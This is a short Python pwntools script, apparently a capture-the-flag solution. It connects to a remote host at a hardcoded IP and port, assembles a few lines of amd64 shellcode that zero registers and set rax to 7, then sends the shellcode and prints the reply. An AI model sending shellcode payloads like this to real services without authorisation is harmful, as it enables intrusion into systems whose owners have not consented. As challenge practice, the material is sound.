#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'
p = remote('157.245.88.100', 7778)
payload = asm("""xor rdi, rdi
xor rsi, rsi
xor rdx, rdx
xor rax, rax
mov rax, 0x7
ret""")

p.send(payload)
print(p.read())
